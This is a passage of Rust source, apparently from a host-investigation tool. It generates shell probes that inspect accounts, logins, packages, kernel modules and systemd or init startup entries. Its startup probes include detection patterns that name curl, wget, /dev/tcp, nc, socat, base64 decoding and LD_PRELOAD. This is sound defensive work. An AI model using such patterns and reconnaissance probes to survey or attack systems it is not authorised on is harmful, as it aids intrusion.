            "{home} printf 'Authorized keys\\n'; if [ -r \"$h/.ssh/authorized_keys\" ]; then awk 'NF>=2 && $1 !~ /^#/ {{print NR \":\" $1 \" \" substr($2,1,24) \"…\"}}' \"$h/.ssh/authorized_keys\" 2>/dev/null | head -n 100; else printf 'none or unreadable\\n'; fi; printf '\\nPrivate-key file metadata (contents are never read)\\n'; find \"$h/.ssh\" -maxdepth 1 -type f -name 'id_*' ! -name '*.pub' -exec stat -c '%a|%U|%s|%n' {{}} + 2>/dev/null | awk -F'|' '{{p=$4; for(i=5;i<=NF;i++) p=p \"|\" $i; sub(\".*/\",\"\",p); printf \"%s\\t%s\\t%s\\t%s bytes\\n\", p, $1, $2, $3}}' | head -n 50"
        ),
        UserInvestigationAction::LoginHistory => {
            "last -Faiw \"$u\" -n 20 2>/dev/null || printf 'No login history\\n'".to_owned()
        }
        UserInvestigationAction::CurrentSessions => {
            "who 2>/dev/null | awk -v u=\"$u\" '$1==u' | head -n 100; printf '\\nSession count\\t%s\\n' \"$(who 2>/dev/null | awk -v u=\"$u\" '$1==u {n++} END {print n+0}')\"".to_owned()
        }
        UserInvestigationAction::FailedLogins => {
            "if command -v lastb >/dev/null 2>&1; then lastb \"$u\" -n 20 2>/dev/null || true; fi; for f in /var/log/auth.log /var/log/secure; do [ -r \"$f\" ] || continue; grep -F -- \"$u\" \"$f\" 2>/dev/null | grep -i 'fail' | tail -n 20; done".to_owned()
        }
        UserInvestigationAction::LastLogin => {
            "lastlog -u \"$u\" 2>/dev/null || last -Faiw \"$u\" -n 1 2>/dev/null || printf 'No login record\\n'".to_owned()
        }
        UserInvestigationAction::Processes => {
            "ps -u \"$u\" -o pid=,ppid=,pcpu=,pmem=,vsz=,rss=,tty=,stat=,lstart=,time=,args= 2>/dev/null | head -n 200 || true".to_owned()
        }
        UserInvestigationAction::DiskUsage => format!(
            "{home} printf 'Home usage\\n'; du -sh -- \"$h\" 2>/dev/null || true; printf '\\nLargest first-level entries\\n'; du -h --max-depth=1 -- \"$h\" 2>/dev/null | sort -hr | head -n 20 || true"
        ),
        UserInvestigationAction::OpenFiles => {
            "if command -v lsof >/dev/null 2>&1; then lsof -nP -u \"$u\" 2>/dev/null | head -n 200; else printf 'lsof is not installed\\n'; fi".to_owned()
        }
        UserInvestigationAction::AbnormalLogin => {
            "printf 'Recent login origins and times\\n'; last -Faiw \"$u\" 2>/dev/null | head -n 50; printf '\\nOff-hours heuristic (00:00-06:59)\\n'; last -Faiw \"$u\" 2>/dev/null | awk '$0 ~ / (0[0-6]):[0-5][0-9]/' | head -n 20".to_owned()
        }
        UserInvestigationAction::Crontab => {
            "printf 'User crontab\\n'; crontab -u \"$u\" -l 2>/dev/null || printf 'none or unreadable\\n'; printf '\\nSystem cron references\\n'; for f in /etc/crontab /etc/cron.d/*; do [ -f \"$f\" ] || continue; grep -Fn -- \"$u\" \"$f\" 2>/dev/null | sed \"s#^#$f:#\"; done | head -n 100".to_owned()
        }
        UserInvestigationAction::SshConfig => format!(
            "{home} printf 'SSH client config\\n'; sed -n '1,300p' -- \"$h/.ssh/config\" 2>/dev/null || printf 'none or unreadable\\n'; printf '\\nKnown-host entry count\\t%s\\n' \"$(awk 'NF && $1 !~ /^#/ {{n++}} END {{print n+0}}' \"$h/.ssh/known_hosts\" 2>/dev/null)\" "
        ),
        UserInvestigationAction::SuspiciousFiles => format!(
            "{home} printf 'Hidden files (depth <= 4)\\n'; find \"$h\" -xdev -maxdepth 4 -type f -name '.*' -print 2>/dev/null | head -n 50; printf '\\nFiles modified in the last 7 days\\n'; find \"$h\" -xdev -maxdepth 5 -type f -mtime -7 -exec stat -c '%y|%n' {{}} + 2>/dev/null | awk -F'|' '{{w=substr($1,1,19); sub(\" \",\"T\",w); p=$2; for(i=3;i<=NF;i++) p=p \"|\" $i; printf \"%s\\t%s\\n\", w, p}}' | head -n 100"
        ),
        // `stat` rather than `find -printf`, for the reason in
        // [`file_facts_awk`]: busybox has no `-printf`, and this panel
        // answering "no setuid files in this home" when it could not look is
        // the same false all-clear as the table it mirrors.
        UserInvestigationAction::SuidFiles => format!(
            "{home} find \"$h\" -xdev -type f \\( -perm -4000 -o -perm -2000 \\) -exec stat -c '%a|%U:%G|%n' {{}} + 2>/dev/null | awk -F'|' '{{p=$3; for(i=4;i<=NF;i++) p=p \"|\" $i; printf \"%s\\t%s\\t%s\\n\", $1, $2, p}}' | head -n 100"
        ),
    };
    format!(
        "u={username}; if ! getent passwd \"$u\" >/dev/null 2>&1; then printf 'User no longer exists\\n'; exit 44; fi; {probe}"
    )
}

fn login_investigation_command(
    identity: &LoginIdentity,
    action: LoginInvestigationAction,
) -> CoreResult<String> {
    if action.requires_source() && identity.source.is_none() {
        return Err(CoreError::validation(
            "login-history investigation",
            "the selected row does not contain a validated source IP address",
        ));
    }
    let username = shq(&identity.username);
    let source = identity.source.map(|ip| shq(&ip.to_string()));
    let probe = match action {
        LoginInvestigationAction::UserDetails => {
            "id \"$u\" 2>/dev/null; printf '\\nAccount\\n'; getent passwd \"$u\" 2>/dev/null; printf '\\nPassword policy\\n'; chage -l \"$u\" 2>/dev/null || true".to_owned()
        }
        LoginInvestigationAction::UserLoginCount => {
            "last -Faiw \"$u\" -n 50 2>/dev/null || true; printf '\\nTotal retained records\\t%s\\n' \"$(last -Faiw \"$u\" 2>/dev/null | awk -v u=\"$u\" '$1==u {n++} END {print n+0}')\"".to_owned()
        }
        LoginInvestigationAction::UserFailedCount => {
            "if command -v lastb >/dev/null 2>&1; then lastb \"$u\" -n 50 2>/dev/null || true; printf '\\nTotal retained failures\\t%s\\n' \"$(lastb \"$u\" 2>/dev/null | awk -v u=\"$u\" '$1==u {n++} END {print n+0}')\"; else printf 'lastb is unavailable\\n'; fi".to_owned()
        }
        LoginInvestigationAction::UserSudoHistory => {
            "for f in /var/log/auth.log /var/log/secure; do [ -r \"$f\" ] || continue; grep -F -- \"$u\" \"$f\" 2>/dev/null | grep -F 'sudo' | tail -n 50; done; journalctl _COMM=sudo -n 500 --no-pager 2>/dev/null | grep -F -- \"$u\" | tail -n 50 || true".to_owned()
        }
        LoginInvestigationAction::SourceLogins => format!(
            "ip={}; last -Faiw 2>/dev/null | grep -F -- \"$ip\" | head -n 100 || true",
            source.as_deref().expect("validated source IP")
        ),
        LoginInvestigationAction::Whois => format!(
            "ip={}; if command -v whois >/dev/null 2>&1; then whois -- \"$ip\" 2>/dev/null | head -n 100 || printf 'WHOIS query failed\\n'; else printf 'whois is not installed\\n'; fi",
            source.as_deref().expect("validated source IP")
        ),
        LoginInvestigationAction::ReverseDns => format!(
            "ip={}; getent hosts \"$ip\" 2>/dev/null || (command -v dig >/dev/null 2>&1 && dig -x \"$ip\" +short 2>/dev/null) || (command -v nslookup >/dev/null 2>&1 && nslookup \"$ip\" 2>/dev/null) || printf 'No reverse DNS result\\n'",
            source.as_deref().expect("validated source IP")
        ),
        LoginInvestigationAction::AuthLogs => {
            "for f in /var/log/auth.log /var/log/secure; do [ -r \"$f\" ] || continue; grep -F -- \"$u\" \"$f\" 2>/dev/null | tail -n 100; done; journalctl -u sshd -u ssh -n 500 --no-pager 2>/dev/null | grep -F -- \"$u\" | tail -n 100 || true".to_owned()
        }
        LoginInvestigationAction::RecentFailures => {
            "if command -v lastb >/dev/null 2>&1; then lastb -Faiw -n 50 2>/dev/null || true; else printf 'lastb is unavailable\\n'; fi".to_owned()
        }
        LoginInvestigationAction::BruteForceCheck => {
            "for f in /var/log/auth.log /var/log/secure; do [ -r \"$f\" ] || continue; grep -F 'Failed password' \"$f\" 2>/dev/null; done | sed -n 's/^.* from \\([^ ]*\\) port .*$/\\1/p' | sort | uniq -c | sort -rn | head -n 30".to_owned()
        }
    };
    let current_user_guard = if action.requires_current_user() {
        "if ! getent passwd \"$u\" >/dev/null 2>&1; then printf 'User no longer exists\\n'; exit 44; fi; "
    } else {
        ""
    };
    Ok(format!("u={username}; {current_user_guard}{probe}"))
}

fn artifact_investigation_command(
    identity: &ArtifactIdentity,
    action: ArtifactInvestigationAction,
) -> CoreResult<String> {
    match (identity, action) {
        (ArtifactIdentity::Package { name, .. }, ArtifactInvestigationAction::Package(action)) => {
            package_investigation_command(name, action)
        }
        (
            ArtifactIdentity::KernelModule { name, .. },
            ArtifactInvestigationAction::KernelModule(action),
        ) => kernel_module_investigation_command(name, action),
        (
            ArtifactIdentity::Environment { name, .. },
            ArtifactInvestigationAction::Environment(action),
        ) => environment_investigation_command(name, action),
        (ArtifactIdentity::Startup { unit, .. }, ArtifactInvestigationAction::Startup(action)) => {
            startup_investigation_command(unit, action)
        }
        (
            ArtifactIdentity::StartupScript { name, path, .. },
            ArtifactInvestigationAction::Startup(action),
        ) => startup_script_investigation_command(name, path, action),
        (
            ArtifactIdentity::Cron {
                username,
                schedule,
                command,
                source,
                ..
            },
            ArtifactInvestigationAction::Cron(action),
        ) => cron_investigation_command(username, schedule, command, source, action),
        (
            ArtifactIdentity::Timer { timer, trigger, .. },
            ArtifactInvestigationAction::Timer(action),
        ) => timer_investigation_command(timer, trigger, action),
        (
            ArtifactIdentity::ShellConfig { path, line, .. },
            ArtifactInvestigationAction::ShellConfig(action),
        ) => shell_config_investigation_command(path, *line, action),
        (
            ArtifactIdentity::Sudoers {
                principal,
                username,
                source,
                ..
            },
            ArtifactInvestigationAction::Sudoers(action),
        ) => sudoers_investigation_command(principal, username.as_deref(), source, action),
        (
            ArtifactIdentity::SuidFile { path, .. },
            ArtifactInvestigationAction::SuidFile(action),
        ) => suid_file_investigation_command(path, action),
        (
            ArtifactIdentity::SshKey {
                username,
                key_type,
                key_content,
                path,
                ..
            },
            ArtifactInvestigationAction::SshKey(action),
        ) => ssh_key_investigation_command(username, key_type, key_content, path, action),
        _ => Err(CoreError::validation(
            "system artifact investigation",
            "the action and artifact identity do not belong to the same inventory",
        )),
    }
}

fn package_investigation_command(
    name: &str,
    action: PackageInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_package_name(name) {
        return Err(invalid_detail_key("package name"));
    }
    let probe = match action {
        PackageInvestigationAction::Details => {
            "if dpkg-query -W \"$p\" >/dev/null 2>&1; then dpkg-query -s \"$p\" 2>/dev/null; elif rpm -q \"$p\" >/dev/null 2>&1; then rpm -qi \"$p\" 2>/dev/null; else printf 'Package is not installed\\n'; fi"
        }
        PackageInvestigationAction::Files => {
            "if dpkg-query -W \"$p\" >/dev/null 2>&1; then dpkg -L \"$p\" 2>/dev/null | head -n 500; elif rpm -q \"$p\" >/dev/null 2>&1; then rpm -ql \"$p\" 2>/dev/null | head -n 500; else printf 'Package is not installed\\n'; fi"
        }
        PackageInvestigationAction::Dependencies => {
            "if dpkg-query -W \"$p\" >/dev/null 2>&1; then dpkg-query -W -f='Depends\\t${Depends}\\nPre-Depends\\t${Pre-Depends}\\nRecommends\\t${Recommends}\\n' \"$p\" 2>/dev/null; elif rpm -q \"$p\" >/dev/null 2>&1; then rpm -qR \"$p\" 2>/dev/null | head -n 500; else printf 'Package is not installed\\n'; fi"
        }
        PackageInvestigationAction::Changelog => {
            "if rpm -q \"$p\" >/dev/null 2>&1; then rpm -q --changelog \"$p\" 2>/dev/null | head -n 300; else base=${p%%:*}; found=0; for f in /usr/share/doc/\"$base\"/changelog.Debian.gz /usr/share/doc/\"$base\"/changelog.gz /usr/share/doc/\"$base\"/changelog.Debian /usr/share/doc/\"$base\"/changelog; do [ -r \"$f\" ] || continue; found=1; printf '%s\\n' \"--- $f ---\"; case \"$f\" in *.gz) gzip -cd -- \"$f\" 2>/dev/null | head -n 300;; *) head -n 300 -- \"$f\" 2>/dev/null;; esac; break; done; [ \"$found\" -eq 1 ] || printf 'No local changelog is available\\n'; fi"
        }
        PackageInvestigationAction::Integrity => {
            "if dpkg-query -W \"$p\" >/dev/null 2>&1; then out=$(dpkg --verify \"$p\" 2>/dev/null | head -n 500); [ -n \"$out\" ] && printf '%s\\n' \"$out\" || printf 'No dpkg verification mismatch reported\\n'; elif rpm -q \"$p\" >/dev/null 2>&1; then out=$(rpm -V \"$p\" 2>/dev/null | head -n 500); [ -n \"$out\" ] && printf '%s\\n' \"$out\" || printf 'No RPM verification mismatch reported\\n'; else printf 'Package is not installed\\n'; fi"
        }
        PackageInvestigationAction::ConfigFiles => {
            "if dpkg-query -W \"$p\" >/dev/null 2>&1; then printf '%s\\n' 'Declared conffiles'; dpkg-query -W -f='${Conffiles}\\n' \"$p\" 2>/dev/null; if command -v debsums >/dev/null 2>&1; then printf '%s\\n' 'Changed conffiles'; debsums -ac \"$p\" 2>/dev/null | head -n 300; fi; elif rpm -q \"$p\" >/dev/null 2>&1; then rpm -V --configfiles \"$p\" 2>/dev/null | head -n 300; else printf 'Package is not installed\\n'; fi"
        }
        PackageInvestigationAction::RelatedServices => {
            "if command -v systemctl >/dev/null 2>&1; then systemctl list-unit-files --type=service --no-legend --no-pager 2>/dev/null | grep -Fi -- \"$p\" | head -n 100 || true; systemctl list-units --all --type=service --no-legend --no-pager 2>/dev/null | grep -Fi -- \"$p\" | head -n 100 || true; else printf 'systemd is unavailable\\n'; fi"
        }
        PackageInvestigationAction::RemovalPreview => {
            "printf 'Simulation only; no package mutation is dispatched\\n'; if dpkg-query -W \"$p\" >/dev/null 2>&1 && command -v apt-get >/dev/null 2>&1; then apt-get -s remove \"$p\" 2>/dev/null | head -n 500 || true; elif rpm -q \"$p\" >/dev/null 2>&1; then rpm -e --test \"$p\" 2>&1 | head -n 500 || true; else printf 'No supported local package simulation is available\\n'; fi"
        }
    };
    Ok(format!("p={}; {probe}; :", shq(name)))
}

fn kernel_module_investigation_command(
    name: &str,
    action: KernelModuleInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_module_name(name) {
        return Err(invalid_detail_key("kernel module name"));
    }
    let probe = match action {
        KernelModuleInvestigationAction::Info => {
            "modinfo \"$m\" 2>/dev/null || printf 'Module metadata is unavailable\\n'"
        }
        KernelModuleInvestigationAction::Dependencies => {
            "printf 'Declared dependencies\\n'; modinfo -F depends \"$m\" 2>/dev/null || true; printf '\\nLoaded row and holders\\n'; grep -F -w -- \"$m\" /proc/modules 2>/dev/null || true; for h in /sys/module/\"$m\"/holders/*; do [ -e \"$h\" ] || continue; basename -- \"$h\"; done"
        }
        KernelModuleInvestigationAction::Parameters => {
            "printf 'Declared parameters\\n'; modinfo -p \"$m\" 2>/dev/null || true; printf '\\nRuntime parameters\\n'; for f in /sys/module/\"$m\"/parameters/*; do [ -f \"$f\" ] || continue; printf '%s\\t' \"$(basename -- \"$f\")\"; head -c 4096 -- \"$f\" 2>/dev/null; printf '\\n'; done"
        }
        KernelModuleInvestigationAction::Path => {
            "path=$(modinfo -n \"$m\" 2>/dev/null); case \"$path\" in /*) printf 'Path\\t%s\\n' \"$path\"; stat -c 'Mode\\t%A (%a)%nOwner\\t%U (%u)%nSize\\t%s%nModified\\t%y' -- \"$path\" 2>/dev/null;; *) printf 'Module path is unavailable\\n';; esac"
        }
        KernelModuleInvestigationAction::Signing => {
            "printf 'Signature ID\\t%s\\n' \"$(modinfo -F sig_id \"$m\" 2>/dev/null)\"; \
            printf 'Signer\\t%s\\n' \"$(modinfo -F signer \"$m\" 2>/dev/null)\"; \
            printf 'Key ID\\t%s\\n' \"$(modinfo -F sig_key \"$m\" 2>/dev/null)\"; \
            printf 'Hash algorithm\\t%s\\n' \"$(modinfo -F sig_hashalgo \"$m\" 2>/dev/null)\" "
        }
        KernelModuleInvestigationAction::Taint => {
            "printf 'Kernel taint value\\t%s\\n' \"$(cat /proc/sys/kernel/tainted 2>/dev/null || printf 'unavailable\\n')\"; \
            printf 'Module taint\\t%s\\n' \"$(cat /sys/module/\"$m\"/taint 2>/dev/null || printf 'none or unavailable\\n')\"; \
            printf 'Interpretation\\t0 means the kernel reports no taint bits\\n' "
        }
        KernelModuleInvestigationAction::Hash => {
            "path=$(modinfo -n \"$m\" 2>/dev/null); case \"$path\" in /*) printf 'Path\\t%s\\n' \"$path\"; md5sum -- \"$path\" 2>/dev/null | sed 's/^/MD5\\t/'; sha256sum -- \"$path\" 2>/dev/null | sed 's/^/SHA256\\t/';; *) printf 'Module path is unavailable\\n';; esac"
        }
        KernelModuleInvestigationAction::Dmesg => {
            "dmesg 2>/dev/null | grep -Fi -- \"$m\" | tail -n 100 || true"
        }
    };
    Ok(format!("m={}; {probe}; :", shq(name)))
}

fn environment_investigation_command(
    name: &str,
    action: EnvVarInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_environment_name(name) {
        return Err(invalid_detail_key("environment variable name"));
    }
    if action == EnvVarInvestigationAction::PathDirectories && name != "PATH" {
        return Err(CoreError::validation(
            "environment investigation",
            "PATH directory inspection is only valid for the PATH variable",
        ));
    }
    let probe = match action {
        EnvVarInvestigationAction::TraceSource => {
            "for f in /etc/environment /etc/profile /etc/bash.bashrc /etc/bashrc /etc/profile.d/* \"$HOME/.profile\" \"$HOME/.bash_profile\" \"$HOME/.bashrc\"; do [ -f \"$f\" ] || continue; grep -Fn -- \"$n\" \"$f\" 2>/dev/null | head -n 50 | while IFS= read -r line; do printf '%s:%s\\n' \"$f\" \"$line\"; done; done"
        }
        EnvVarInvestigationAction::LdPreload => {
            "printf 'Current process environment\\n'; env 2>/dev/null | grep -E '^LD_(PRELOAD|LIBRARY_PATH)=' || printf 'No LD preload variables are set\\n'; printf '\\n/etc/ld.so.preload\\n'; if [ -r /etc/ld.so.preload ]; then sed -n '1,100p' /etc/ld.so.preload; else printf 'File is absent or unreadable\\n'; fi"
        }
        EnvVarInvestigationAction::PathDirectories => {
            "printf '%s' \"$PATH\" | tr ':' '\\n' | while IFS= read -r d; do if [ -z \"$d\" ]; then printf '<empty entry>\\tcurrent directory\\n'; continue; fi; printf '%s\\t' \"$d\"; stat -c '%A (%a) %U:%G' -- \"$d\" 2>/dev/null || printf 'missing or unreadable\\n'; done"
        }
        EnvVarInvestigationAction::ProcessOwners => {
            "count=0; for d in /proc/[0-9]*; do [ -r \"$d/environ\" ] || continue; line=$(tr '\\0' '\\n' < \"$d/environ\" 2>/dev/null | awk -v key=\"$n=\" 'index($0,key)==1 {print; exit}'); [ -n \"$line\" ] || continue; uid=$(stat -c '%u' -- \"$d\" 2>/dev/null); user=$(getent passwd \"$uid\" 2>/dev/null | cut -d: -f1); printf '%s\\t%s\\t%s\\n' \"${user:-$uid}\" \"${d##*/}\" \"$line\"; count=$((count+1)); [ \"$count\" -ge 100 ] && break; done; [ \"$count\" -gt 0 ] || printf 'No readable process environment contains this variable\\n'"
        }
    };
    Ok(format!("n={}; {probe}; :", shq(name)))
}

fn startup_investigation_command(
    unit: &str,
    action: StartupInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_service_unit(unit) {
        return Err(invalid_detail_key("systemd startup service"));
    }
    let probe = match action {
        StartupInvestigationAction::Details => {
            "systemctl show \"$u\" --no-pager -p Id -p Description -p LoadState -p ActiveState -p SubState -p UnitFileState -p FragmentPath -p DropInPaths -p ExecStart 2>/dev/null"
        }
        StartupInvestigationAction::Command => {
            "printf 'ExecStart\\n'; systemctl show \"$u\" --no-pager -p ExecStart --value 2>/dev/null; printf '\\nExecStartPre\\n'; systemctl show \"$u\" --no-pager -p ExecStartPre --value 2>/dev/null; printf '\\nExecStartPost\\n'; systemctl show \"$u\" --no-pager -p ExecStartPost --value 2>/dev/null"
        }
        StartupInvestigationAction::UnitFile | StartupInvestigationAction::ViewConfig => {
            "systemctl cat \"$u\" --no-pager 2>/dev/null || printf 'Unit configuration is unavailable\\n'"
        }
        StartupInvestigationAction::StartupType => {
            "printf 'Enabled state\\t%s\\n' \"$(systemctl is-enabled \"$u\" 2>/dev/null || true)\"; \
            printf 'Preset\\t%s\\n' \"$(systemctl show \"$u\" -p Preset --value 2>/dev/null)\"; \
            printf 'WantedBy\\t%s\\n' \"$(systemctl show \"$u\" -p WantedBy --value 2>/dev/null)\"; \
            printf 'RequiredBy\\t%s\\n' \"$(systemctl show \"$u\" -p RequiredBy --value 2>/dev/null)\"; \
            printf 'Default target\\t%s\\n' \"$(systemctl get-default 2>/dev/null || true)\" "
        }
        StartupInvestigationAction::ConfigLocation => {
            "systemctl show \"$u\" --no-pager -p FragmentPath -p SourcePath -p DropInPaths 2>/dev/null"
        }
        StartupInvestigationAction::SuspiciousPath => {
            "execs=$(systemctl show \"$u\" -p ExecStart --value 2>/dev/null); printf 'ExecStart\\t%s\\n' \"$execs\"; printf '%s\\n' \"$execs\" | grep -E '(/tmp/|/var/tmp/|/dev/shm/|/home/|curl[[:space:]]|wget[[:space:]]|nc[[:space:]]|ncat[[:space:]]|bash[[:space:]]+-c|sh[[:space:]]+-c)' || printf 'No high-signal suspicious path token matched\\n'; path=$(systemctl show \"$u\" -p FragmentPath --value 2>/dev/null); case \"$path\" in /*) stat -c 'Unit file\\t%n%nMode\\t%A (%a)%nOwner\\t%U:%G' -- \"$path\" 2>/dev/null;; esac"
        }
        StartupInvestigationAction::FileSignature => {
            "path=$(systemctl show \"$u\" -p FragmentPath --value 2>/dev/null); case \"$path\" in /*) printf 'Path\\t%s\\n' \"$path\"; sha256sum -- \"$path\" 2>/dev/null | awk '{print \"SHA256\\t\"$1}'; file -b -- \"$path\" 2>/dev/null | sed 's/^/Type\\t/';; *) printf 'Unit file path is unavailable\\n';; esac"
        }
        StartupInvestigationAction::ModificationTime => {
            "systemctl show \"$u\" -p FragmentPath -p DropInPaths --value 2>/dev/null | tr ' ' '\\n' | while IFS= read -r p; do case \"$p\" in /*) stat -c '%n\\t%y\\t%A\\t%U:%G' -- \"$p\" 2>/dev/null;; esac; done"
        }
        StartupInvestigationAction::MalwareIndicators => {
            "cfg=$(systemctl cat \"$u\" --no-pager 2>/dev/null); printf '%s\\n' \"$cfg\" | grep -Ein '(curl|wget|/dev/tcp|base64[[:space:]]+-d|LD_PRELOAD|/tmp/|/dev/shm/|nc[[:space:]]|ncat[[:space:]]|socat|python[^[:space:]]*[[:space:]]+-c|perl[[:space:]]+-e)' | head -n 100 || printf 'No high-signal malicious token matched\\n'"
        }
        StartupInvestigationAction::Dependencies => {
            "systemctl list-dependencies \"$u\" --all --no-pager 2>/dev/null | head -n 300; printf '\\nReverse dependencies\\n'; systemctl list-dependencies \"$u\" --reverse --all --no-pager 2>/dev/null | head -n 300"
        }
        StartupInvestigationAction::BootOrder => {
            "systemctl show \"$u\" --no-pager -p After -p Before -p Wants -p Requires -p WantedBy -p RequiredBy 2>/dev/null"
        }
        StartupInvestigationAction::BootTime => {
            "if command -v systemd-analyze >/dev/null 2>&1; then systemd-analyze blame --no-pager 2>/dev/null | grep -F -- \"$u\" | head -n 20 || printf 'Unit has no retained boot timing row\\n'; else printf 'systemd-analyze is unavailable\\n'; fi"
        }
        StartupInvestigationAction::ResourceUsage => {
            "systemctl show \"$u\" --no-pager -p ActiveState -p SubState -p MainPID -p TasksCurrent -p MemoryCurrent -p CPUUsageNSec -p IOReadBytes -p IOWriteBytes -p NRestarts 2>/dev/null"
        }
        StartupInvestigationAction::StartupLogs => {
            "journalctl -u \"$u\" -b --no-pager -n 200 2>/dev/null || printf 'No boot log is available\\n'"
        }
        StartupInvestigationAction::ErrorLogs => {
            "journalctl -u \"$u\" -p err --no-pager -n 200 2>/dev/null || printf 'No retained error log is available\\n'"
        }
        StartupInvestigationAction::RunHistory => {
            "journalctl -u \"$u\" --no-pager -n 500 2>/dev/null | grep -E '(Started|Starting|Stopped|Stopping|Failed|failure|Main process exited)' | tail -n 200 || printf 'No retained lifecycle event is available\\n'"
        }
        StartupInvestigationAction::ConfigSummary => {
            "printf 'Identity and state\\n'; systemctl show \"$u\" --no-pager -p Id -p Description -p ActiveState -p SubState -p UnitFileState -p FragmentPath -p DropInPaths -p ExecStart 2>/dev/null; printf '\\nEffective unit file\\n'; systemctl cat \"$u\" --no-pager 2>/dev/null | head -n 300"
        }
    };
    Ok(format!("u={}; {probe}; :", shq(unit)))
}

/// Every boot directory that links this script, one path per line.
///
/// Covers the Debian and Red Hat layouts (`/etc/rc2.d/S01name`, and the same
/// under `/etc/rc.d`) and the OpenRC one (`/etc/runlevels/default/name`),
/// because the tab lists entries from all of them.
const SCRIPT_BOOT_LINK_PATHS: &str = "for d in /etc/rc?.d /etc/rc.d/rc?.d; do [ -d \"$d\" ] || continue; for l in \"$d\"/*; do [ -e \"$l\" ] || continue; case \"${l##*/}\" in [SK][0-9][0-9]\"$n\") printf '%s\\n' \"$l\";; esac; done; done; for l in /etc/runlevels/*/\"$n\"; do [ -e \"$l\" ] || continue; printf '%s\\n' \"$l\"; done";

/// The same links, with a line saying so when there are none.
const SCRIPT_BOOT_LINKS: &str = "msg='No LSB header'; m=$({ for d in /etc/rc?.d /etc/rc.d/rc?.d; do [ -d \"$d\" ] || continue; for l in \"$d\"/*; do [ -e \"$l\" ] || continue; case \"${l##*/}\" in [SK][0-9][0-9]\"$n\") printf '%s\\n' \"$l\";; esac; done; done; for l in /etc/runlevels/*/\"$n\"; do [ -e \"$l\" ] || continue; printf '%s\\n' \"$l\"; done; } | sort); if [ -n \"$m\" ]; then printf '%s\\n' \"$m\"; else printf 'No boot link found\\n'; fi";

/// The links again, each with when it was last touched.
const SCRIPT_BOOT_LINKS_STAT: &str = "m=$({ for d in /etc/rc?.d /etc/rc.d/rc?.d; do [ -d \"$d\" ] || continue; for l in \"$d\"/*; do [ -e \"$l\" ] || continue; case \"${l##*/}\" in [SK][0-9][0-9]\"$n\") stat -c '%n|%y|%A|%U:%G' -- \"$l\" 2>/dev/null;; esac; done; done; for l in /etc/runlevels/*/\"$n\"; do [ -e \"$l\" ] || continue; stat -c '%n|%y|%A|%U:%G' -- \"$l\" 2>/dev/null; done; } | sort | awk -F'|' '{printf \"%s\\n  modified %s\\n  mode %s owner %s\\n\", $1, $2, $3, $4}'); if [ -n \"$m\" ]; then printf '%s\\n' \"$m\"; else printf 'No boot link found\\n'; fi";

/// The script's own file facts.
///
/// `stat -c` does not interpret backslash escapes and reads `%n` as the file
/// name, so a format string with `\t` and `%n` in it comes back with literal
/// backslashes and the path repeated between every field. One separator and
/// one `awk` reads correctly on both userlands.
const SCRIPT_STAT: &str = "m=$(stat -c '%U:%G|%A (%a)|%s|%y' -- \"$p\" 2>/dev/null); if [ -n \"$m\" ]; then printf '%s\\n' \"$m\" | awk -F'|' '{printf \"Owner\\t%s\\nMode\\t%s\\nSize\\t%s\\nModified\\t%s\\n\", $1, $2, $3, $4}'; else printf 'The script is unreadable\\n'; fi";

/// The LSB block a sysvinit script declares itself with.
const LSB_HEADER: &str =
    "sed -n '/### BEGIN INIT INFO/,/### END INIT INFO/p' < \"$p\" 2>/dev/null | head -n 40";

/// The dependency block an OpenRC script declares itself with instead.
const OPENRC_DEPEND: &str = "awk '/^[[:space:]]*depend[[:space:]]*\\(\\)/,/^[[:space:]]*}/' < \"$p\" 2>/dev/null | head -n 20";

/// Print what `m` caught, or the `msg` that says nothing was caught.
///
/// A `|| printf` after a pipeline never fires: the pipeline's status is the
/// last command's, and `head` succeeds on empty input. Every "nothing matched"
/// line here was unreachable for exactly that reason until it was captured
/// into a variable first.
///
/// The message is a separate shell variable rather than an argument spliced
/// onto the end, because a fragment that has to be completed by its caller is
/// a fragment that will one day be pasted without its `fi`.
const SHOW_MSG: &str =
    "if [ -n \"$m\" ]; then printf '%s\\n' \"$m\"; else printf '%s\\n' \"$msg\"; fi";

/// Where a boot script keeps the settings it reads, across the three layouts.
const SCRIPT_CONFIG_FILES: &str = "for f in \"/etc/default/$n\" \"/etc/conf.d/$n\" \"/etc/sysconfig/$n\"; do [ -f \"$f\" ] || continue; printf '%s\\n' \"$f\"; done";

/// The logs a script's own messages land in when there is no journal.
const SCRIPT_LOG_FILES: &str =
    "/var/log/syslog /var/log/messages /var/log/boot.log /var/log/rc.log /var/log/daemon.log";

/// What can be asked of a boot entry that is a script rather than a unit.
///
/// The systemd answers all come from one program that knows everything about
/// a unit. A script has no such program: the same questions are answered by
/// reading the script, the directories that link it, the file it takes its
/// settings from, and the logs it writes into. Two questions have no answer
/// at all here and are refused before the menu offers them; see
/// [`StartupInvestigationAction::applies_to_script`].
fn startup_script_investigation_command(
    name: &str,
    path: &str,
    action: StartupInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_init_script_name(name) {
        return Err(invalid_detail_key("boot script name"));
    }
    let path = validated_absolute_path(path)?;
    let probe = match action {
        StartupInvestigationAction::Details => format!(
            "printf 'Name\\t%s\\nScript\\t%s\\n' \"$n\" \"$p\"; {SCRIPT_STAT}; printf '\\nLSB header\\n'; m=$({LSB_HEADER}); {SHOW_MSG}; printf '\\nOpenRC depend()\\n'; msg='No OpenRC depend block'; m=$({OPENRC_DEPEND}); {SHOW_MSG}"
        ),
        StartupInvestigationAction::Command => format!(
            "printf 'Shebang\\t%s\\n\\nLines that start something\\n' \"$(head -n 1 < \"$p\" 2>/dev/null)\"; msg='No start line matched'; m=$(grep -nE '(start-stop-daemon|supervise-daemon|command=|command_args=|daemon[[:space:]]|exec[[:space:]]|\\$DAEMON|/usr/(s?bin|local)/)' < \"$p\" 2>/dev/null | head -n 60); {SHOW_MSG}"
        ),
        StartupInvestigationAction::UnitFile => format!(
            "msg='The script is unreadable'; m=$(nl -ba < \"$p\" 2>/dev/null | head -n 400); {SHOW_MSG}"
        ),
        StartupInvestigationAction::ViewConfig => {
            "shown=0; for f in \"/etc/default/$n\" \"/etc/conf.d/$n\" \"/etc/sysconfig/$n\"; do [ -f \"$f\" ] || continue; shown=1; printf '== %s\\n' \"$f\"; nl -ba < \"$f\" 2>/dev/null | head -n 200; done; [ \"$shown\" = 1 ] || printf 'This script has no settings file in /etc/default, /etc/conf.d or /etc/sysconfig\\n'".to_owned()
        }
